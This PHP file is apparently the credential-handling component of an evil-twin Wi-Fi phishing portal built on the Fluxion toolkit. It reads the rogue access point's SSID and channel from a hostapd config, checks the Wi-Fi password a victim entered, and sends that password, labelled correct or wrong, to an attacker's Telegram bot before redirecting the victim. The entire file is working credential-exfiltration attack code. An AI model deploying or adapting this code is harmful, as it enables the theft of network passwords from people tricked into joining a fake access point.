<?php
    require_once("authenticator.php");
	
    $config_telegram = parse_ini_file("telegram.conf");

    function telegram($msg, $telegrambot, $telegramchatid){
      $url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$msg,'parse_mode'=>'html');
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);
      return $result;
    }
    
    $hostapd_path = array_map('basename', glob("$FLUXIONWorkspacePath/*hostapd.conf", GLOB_BRACE));
    $hostapd_file = parse_ini_file("$FLUXIONWorkspacePath/".$hostapd_path[0]);
    $network_info = "<b>Network: </b>".$hostapd_file["ssid"].PHP_EOL."<b>Channel: </b>".$hostapd_file["channel"].PHP_EOL.PHP_EOL;
     
    if($candidate_key_result == "2"){
       if($config_telegram["enable"] == "1")
           telegram ($network_info."<b>Correct Password:</b>".PHP_EOL."<code>".$candidate_key."</code>", $config_telegram["telegramAPIBot"], $config_telegram["telegramUserId"]);
       header("Location:final.html");
    }
    else{
       if($config_telegram["enable"] == "1")
           telegram ($network_info."<b>Error Password:</b>".PHP_EOL."<code>".$candidate_key."</code>", $config_telegram["telegramAPIBot"], $config_telegram["telegramUserId"]);
       header("Location:error.html");
    }
